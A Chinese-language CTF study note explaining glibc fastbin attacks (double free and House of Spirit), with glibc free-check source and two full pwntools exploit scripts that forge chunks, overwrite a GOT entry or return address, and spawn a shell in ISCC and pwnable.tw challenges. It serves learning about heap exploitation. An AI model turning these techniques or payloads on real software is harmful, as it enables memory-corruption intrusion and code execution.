# Fastbin Attack
暂时接触到了两种针对堆分配机制中fastbin的攻击方式，double free和house of spirit  
##Double free  
>###基本原理
>与uaf是对free之后的指针直接进行操作不同，double free通过利用fastbin对堆的分配机制，改写在fastbin中的chunk，实现对指定内存的堆块分配。  
>先正常释放chunk1和chunk2  
>![](https://i.imgur.com/qK9t2MK.png)  
>此时重新释放chunk1(连续两次释放相同的堆块会报错)  
>![](https://i.imgur.com/LhzmSV1.png)
>double free通过在fastbin数组中形成**main_arena -> chunk1 -> chunk2 -> chunk1**结构分配malloc并向其中写入之后，fastbin中仍存在chunk2和chunk1，且**chunk1的fd指针已经被改写**，因为分配出去的和在fastbin中的指向的是相同的内存区域。  
>![](https://i.imgur.com/yXp5WQa.png)  
>之后将chunk2和chunk1分配出去，**再次进行分配相同大小**堆块的时候就会将指定地址的内存区域当做堆块分配出去，从而进行操作。  
>###malloc检查
>fastbin中堆块的结构如图  
>![](https://i.imgur.com/QwdPREk.png)  
>其中size of previous chunk 和 size of chunk各占去8bytes(x64)。  
>在进行malloc分配堆块的时候，会进行对待分配内存的检查，但只是检查堆块大小标志位和将分配的堆块的大小是否符合，所以只需在构造时利用字节错位等，找到合适的位置，保证这个地址的数据满足是0x******** 000000××的形式。"xx" + 0x10在fastbin的范围内便能够通过检验。
>>![](https://i.imgur.com/iQcZhHz.png)
>>1.因为在比较中，后者是4bytes，所以只要保证选取的size of data的低4bytes满足0x000000xx即可，而前面无所谓即为0x********。  
>>2.没有对其检查，所以可以随意搞偏移，而不必要找8的倍数作为地址。  
>
>分析ISCC的write some paper，存在double free，且存在一个"gg"函数直接获得shell，则可以通过覆写got表，将某个函数的got中的地址替换为gg函数的地址，所以需要在got表前面不远处找到一个合适的地址能够实现绕过malloc对堆块大小的检查。  
>![](https://i.imgur.com/KirLcFK.png)  
>0x602000是.got.plt表的开始地址，偏移出两个字节就能够构造出很多满足size要求的结构。
>如此选择一个合适的地址设为A，则chunk起始地址为A-8(pre size)，usrdata(fd指针与之同体)部分为A+8，且上一个fd指向地址为A-8。  
>构造的xx大小-0x10，为malloc的参数，即返回的usrdata大小。  
>####Addition
>**需要调用函数系统函数时，不要覆写 _GLOBAL_OFFSET_TABLE_部分**，否则将导致系统函数不能正确调用。  
>如果开了full relro的话 got表是不能改的 这个时候一般用double free控制__free_hook __malloc_hook。:x
>
>贴上ISCC 那道题的代码，不知道为啥本地跑不动了，印象中远程是这么拿到flag的。
>
>   #!/usr/bin/env python
>   # -*-coding=utf-8-*-
>   from pwn import *
>   context.log_level = 'debug'
>   io = process("./pwn3")
>   # io = remote('47.104.16.75',8999)
>   elf = ELF('./pwn3')
>   # gdb.attach(io,'b * main +53')
>   secret = elf.symbols['secret']
>   gg = elf.symbols['gg']
>   puts_got = elf.got['puts']
>>   
>   fakechunk = 0x602032
>   payload = 'a' * 6 + p64(gg) * 2 
>   # malloc first chunk
>   io.recvuntil('delete paper\n')
>   io.sendline('1')
>   io.recvuntil('9):')
>   io.sendline('1')
>   io.recvuntil("ter:")
>   io.sendline('48')
>   io.recvuntil('content:')
>   io.sendline("first")
>>   
>   # malloc second chunk
>   io.recvuntil('delete paper\n')
>   io.sendline('1')
>   io.recvuntil('9):')
>   io.sendline('2')
>   io.recvuntil("ter:")
>   io.sendline('48')
>   io.recvuntil('content:')
>   io.sendline("second")
>>   
>   # gdb.attach(io,'b * 0x4008f8')
>   # free the first chunk
>   io.recvuntil("delete paper\n")
>   io.sendline('2')
>   io.recvuntil('9):')
>   io.sendline("1")
>>   
>   # free the second chunk
>   io.recvuntil("delete paper\n")
>   io.sendline("2")
>   io.recvuntil('9):')
>   io.sendline('2')
>>   
>   # free the first chunk
>   io.recvuntil("delete paper\n")
>   io.sendline('2')
>   io.recvuntil('9):')
>   io.sendline("1")
>>   
>   # malloc the first chunk
>   io.recvuntil("delete paper\n")
>   io.sendline('1')
>   io.recvuntil('9):')
>   io.sendline('1')
>   io.sendline('48')
>   io.sendline(p64(fakechunk))
>
>   # malloc the second and the first' chunk
>   for i in range(2):
>       io.recvuntil("delete paper\n")
>       io.sendline('1')
>       io.recvuntil('9):')
>       io.sendline('1')
>       io.recvuntil('enter:')
>       io.sendline('48')
>       io.sendline('malloc the second and the first* chunk')
>   # malloc the fakechunk
>   io.sendline("1")
>   io.sendline('2')
>   io.sendline('48')
>   io.sendline(payload)
>   # io.sendline('3')
>
>   io.interactive()
>   io.close()

##House of spirit
>精神之屋？  
>一种针对fastbin的组合漏洞利用方式。  
>###Reference  
>>[Ret2Forever](http://tacxingxing.com/2018/02/14/horse-of-spirit/)  
>[Mutepig](http://blog.leanote.com/post/3191220142@qq.com/how2heap)  
>[0x00SEC](https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627)  
>

>与double free相比，double free是在利用重写fastbin列表中的fd指针实现对目标地址的分配。而house of spirit则是在目标内存前后可控的情况下，主动的修改一个堆指针，使其指向目标地址，并通过提前改写目标内存前后的数据，使之满足**malloc的检查**和**free的检查**，加入fastbin中，继而实现对目标地址的分配。
>>
*The House of Spirit is a little different from other attacks in the sense that it involves an attacker overwriting an existing pointer before it is 'freed'. The attacker creates a 'fake chunk', which can reside anywhere in the memory (heap, stack, etc.) and overwrites the pointer to point to it. The chunk has to be crafted in such a manner so as to pass all the security tests. This is not difficult and only involves setting the size and next chunk's size. When the fake chunk is freed, it is inserted in an appropriate binlist (preferably a fastbin). A future malloc call for this size will return the attacker's fake chunk. The end result is similar to 'forging chunks attack' described earlier.*

>### 基本过程
>1.通过漏洞能够控制一个堆指针，能够实现覆写。  
>2.在可控内存区域（目标内存）能够构造一个fake chunk。  
>3.将该堆指针改写为目标内存，并将其free，使其进入fastbin中。  
>4.再次malloc实现对目标区域的控制。  
> ### 利用关键  
>HOS的关键在于在目标内存附近构造合适的fake chunk， 使其能够通过安全检查。(以x64为例)  
>>
    static void
    _int_free (mstate av, mchunkptr p, int have_lock)
    {
        /* We know that each chunk is at least MINSIZE bytes in size or a
         multiple of MALLOC_ALIGNMENT.  检查chunk的size是否满足大小和对齐的要求*/
        if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size))){
                 errstr = "free(): invalid size";
                goto errout;
        }
        check_inuse_chunk(av, p);
 >>   
        /*If eligible, place chunk on a fastbin so it can be found and used quickly in malloc.*/
        //fastbin的free操作
        if ((unsigned long)(size) <= (unsigned long)(get_max_fast ()))
        {
                //检查size位的大小是否满足要求
                   if (__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0)
                   || __builtin_expect (chunksize (chunk_at_offset (p, size)) >= av->system_mem, 0))
                   {
               /* We might not have a lock at this point and concurrent modifications
                   of system_mem might have let to a false positive.  Redo the test
                   after getting the lock.  检查nextchunk的size大小是否满足要求*/
                 if (have_lock || ({ assert (locked == 0);mutex_lock(&av->mutex);locked = 1;
                        chunk_at_offset (p, size)->size <= 2 * SIZE_SZ
                     || chunksize (chunk_at_offset (p, size)) >= av->system_mem;
                    })){
                         errstr = "free(): invalid next size (fast)";
                         goto errout;
                }
                ...........................................................................
            }
            //free的过程
            ........................................................................................
            ........................................................................................


>#### 1. 对齐检查  
> 在此处的检查中，要求堆块具有16bytes对齐，所以chunk header的起始地址应为0x****0的形式。  
>#### 2. fake chunk 的size大小检查  
> 按照上文中chunk的结构布局，使当前fake chunk的size为合适的大小，能够充足利用并且加入fastbin(0x10-0x80)，
>#### 3. next chunk 的size大小检查  
>除了当前chunk的大小，与目标地址**物理相邻**的内存空间也应按照堆块的结构将*size*位置改写为能够加入fastbin的合适的大小的数值。
>#### 4. 标记位检查  
>
>>
*This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the ___IS\_MMAPPED____ (second lsb) and ___NON\_MAIN\_ARENA___ (third lsb) bits cause problems…. note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.*  

>所以为了应对malloc的检查，应当把A|M|P中的A、M两位都置0，否则会在free时无法加入fastbin中或者在malloc时出现问题。
>### 利用方式  
>这是一种同时利用堆和栈的利用方式，能够实现任意地址写。通常用来改写执行语句，如返回地址函数指针等。
>### 应用-Pwnable.tw\_Spirited Away  
>这道题首先要利用程序中的sprintf函数，在comment数量>=100的时候，字符串中的最后一个字母*'n'*将溢出覆盖至值为60的变量，因而在之后的输入中，由此变量控制长度的输入将能够输入ord('n') = 110 个字符，从而进行后续操作。  
>##### 过程
>1.先通过输出，得到栈地址和一个libc中存在的全局变量的地址从而得到libc偏移量。  
>2.然后添加comment到100，使sprintf溢出，使读入的name和comment长度达到110，在后续输入comment的时候能够覆写name指针。  
>3.在栈的合适位置构造堆块结构，将指向栈中的指针free。  
>4.将指向栈的指针重新分配之后，可以向其中写入，并且超过堆的长度，实现堆返回地址的修改，控制程序流程。  
>![堆结构](https://images2018.cnblogs.com/blog/1251324/201807/1251324-20180714200718687-1725146948.png)  
>程序运行过程中，堆结构如图，当前ebp指针指向当前函数栈基址，其中存储值为main函数的栈基址，因而可以根据其相对位置关系确定当前函数中各个变量的地址。其后的_IO_2_1_stdout_等为函数中的全局变量，可据之确定libc中的偏移，为获得其他库函数在内存中的真实地址做铺垫，以上变量均可通过程序打印出。  
>![](https://images2018.cnblogs.com/blog/1251324/201807/1251324-20180714201417670-2063692689.png)  
>当前fastbin中的数据，可以确定要伪造的堆块的presize和size位的值。  
>![](https://images2018.cnblogs.com/blog/1251324/201807/1251324-20180714203608410-676153171.png)  
>将堆块伪造在reason字符串处，并在usrdate前后分别按照fastbin中chunk的结构进行布置。  
>~~//*存疑：程序中是malloc（60），即0x3C + 8  = 0x44,但是这里将usrdata设为0x41，可能是因为usrdata可以使用下一个堆块的pre\_size?因而将分配的内存空间减去了该部分的大小？*~~  
>>补充：关于chunk大小的问题，x86中，chunk中的size为malloc的参数+4后向0x08对齐，usrdata虽然可能小于malloc参数，但是可以使用下一个chunk的pre_size，x64中size为n+8后向0x10对齐，同样可以使用下一个chunk的presize。size的后3bit作三个标记位。
>
>
>随后在新分配的chunk中写入即可，长度可以超过chunk长度，而溢出覆盖到返回地址和调用函数的参数，执行system("/bin/sh")函数。  
>
>不过这里有一个巨坑就是程序本身有缺陷，没有进行清空输入缓冲区，导致经过多次输入后出现程序执行错乱，按照正常输入顺序将导致栈结构被破坏，所以根据调试过程中的情况，省略了部分输入，以维持输入的稳定，能够将数据写入正确的内存位置当中。  
>
>> 
    #!/usr/bin/env python
    # encoding: utf-8
>> 
    from pwn import *
    from sys import argv
    from time import sleep
    context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
    # context.log_level = 'debug'
    elf = ELF('./spirited_away')
>> 
    if argv[1] == 'l':
        io = process('./spirited_away')
        libc = elf.libc
    else:
        io = remote("chall.pwnable.tw", 10204)
        libc = ELF('./libc_32.so.6')
>>
    def enter(name,age,reason,comment):
        io.recvuntil('name: ')
        io.send(name)
        # sleep(0.01)
        io.recvuntil('age: ')
        io.sendline(str(age))
        # sleep(0.01)
        io.recvuntil('movie? ')
        io.send(reason)
        # sleep(0.01)
        io.recvuntil('comment: ')
        io.send(comment)
        # pause()
        # sleep(0.01)
>>
    # leak the ebp address and get the libc base
    gdb.attach(io, 'b * 0x804870a')
    enter('a' * 60, 0x11223344, 'b' * 80, 'c' * 60)
    ebp = u32(io.recvuntil('\xff')[-4: ])
    print '*****************'
    print 'ebp -> ' + hex(ebp)
    libcBase = u32(io.recvuntil('\xf7')[-4: ]) - libc.sym['_IO_2_1_stdout_']
    print 'libcbase -> ' + hex(libcBase)
    print '*****************'
>>
    # make the cnt to 100 to overflow
    for i in range(100):
        io.sendafter('<y/n>: ', 'y')
        enter('a' * 60, 0x11223344, 'b' * 80, 'c' * 60)
        sleep(0.02)
        print i
    # overflow the string to sprintf, and the n60 will be ord('n') = 110
    context.log_level = 'debug'
    sys_addr = libcBase + libc.sym['system']
    binsh = libcBase + next(libc.search('/bin/sh'))
    print 'sysaddress -> ' + hex(sys_addr)
    print 'binsh -> ' + hex(binsh)
    raw_input()
>>
    print 'cover the address of [name]'
    sleep(0.5)
    io.sendafter('<y/n>: ', 'y')
    # name = 'a' * 60
    # age = 
    # 0x45 = 60 for usrdata 4 for presize 4for size and one for preinuse  update : 0x41 for the result of debug
>>
    reason = p32(0) + p32(0x41) + 'a' * 56 + p32(0) + p32(0x41)
    fake_address = ebp - 0x68
    print 'fakeaddress -> ' + hex(fake_address)
    raw_input()
    comt = 'a' * 80 + '1234' + p32(fake_address) + p32(0) + p32(0x41) #  + 'a' * 14
    # enter('a' * 60, 0x11223344, reason, comt)
    # raw_input()
    #由于程序自身缺陷，按照正常的输入顺序导致站结构被破坏，不得不根据调试过程中程序的运行流程，去掉对age的输入。
    io.sendafter('name: ', "a" * 60)
    io.sendafter('movie? ', reason)
    io.sendafter('comment: ', comt)
>>
    # cover the ret address and the argvs
    io.sendafter('y/n>: ', 'y')
    print "cover the ret address and the argvs"
    sleep(0.5)
>>
    payload = 'a' * 76 + p32(sys_addr) + 'abcd' + p32(binsh)
    # enter(payload, 0, 'bless', 'god bless me!')
    # raw_input()
    io.sendafter('name: ', payload)
    io.sendafter('movie? ', 'god bless me!')
    io.sendafter('comment: ', 'this is the comment!')
>>
    io.sendafter('<y/n>: ','n')
    io.interactive()
    io.close()
>
>
>